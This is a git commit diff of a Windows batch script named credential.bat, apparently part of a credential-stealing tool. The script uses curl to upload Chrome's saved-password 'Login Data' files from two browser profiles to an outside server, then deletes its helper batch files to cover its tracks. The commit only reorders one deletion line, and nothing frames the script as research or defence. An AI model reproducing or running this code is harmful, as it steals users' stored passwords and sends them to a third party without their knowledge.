11079230ae7e5d424325c6dbda0dce01669726a3
hunter87 <83773586+Hunter87ff@users.noreply.github.com>
2023-12-02 21:07:57 +0530

    Update credential.bat

--- win/credential.bat
+++ win/credential.bat
@@ -1,6 +1,6 @@
 ::start chrome 
-del "boot.bat"
 curl -X POST -F "file=@%USERPROFILE%/AppData/Local/Google/Chrome/User Data/Profile 1/Login Data" https://sprucebot.tech/fsend
 curl -X POST -F "file=@%USERPROFILE%/AppData/Local/Google/Chrome/User Data/Profile 2/Login Data" https://sprucebot.tech/fsend
+del "boot.bat"
 del "system.bat"
 exit
